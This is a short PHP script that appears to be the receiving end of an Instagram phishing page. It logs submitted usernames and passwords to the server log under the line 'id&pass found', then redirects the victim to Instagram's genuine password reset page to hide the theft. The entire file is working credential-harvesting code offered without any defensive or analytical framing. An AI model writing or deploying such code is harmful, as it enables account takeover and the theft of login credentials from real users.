<?php
error_log("-----------------------------------------------------------------------");
error_log("id&pass found");
error_log("Account: " . $_POST['username'] . " Pass: " . $_POST['password'] );
error_log("-----------------------------------------------------------------------");
header('Location: https://www.instagram.com/accounts/password/reset/');
exit();
